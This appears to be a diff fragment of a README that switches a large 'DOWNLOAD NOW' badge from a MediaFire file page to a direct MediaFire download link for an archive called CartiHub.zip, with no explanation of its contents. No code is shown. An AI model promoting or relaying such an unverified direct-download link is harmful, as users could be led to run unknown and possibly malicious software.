@@ -3,7 +3,7 @@
 
 <div align="center">
   <br>
-  <a href="https://www.mediafire.com/file/dshtoi07wccv3xx">
+  <a href="https://download2278.mediafire.com/366xhx9mrnlg0IFheB0EPEjxt5aGT-itFJTHOlVdADPS9jcf6zrf3f6fL3owQ8xyR3Fubhfmzfo_8xxyMnaIjLESMaBSE-jGA-1pBhqPixy6gHlchSR2AJneM_wkbDByjs7WFSH0GM9eK4ateQPN_k-V4ymXznhq5pq3aHvChfU/dshtoi07wccv3xx/CartiHub.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-8B5CF6?style=for-the-badge&logo=FREE&logoColor=white"
          width="350"
          height="80"
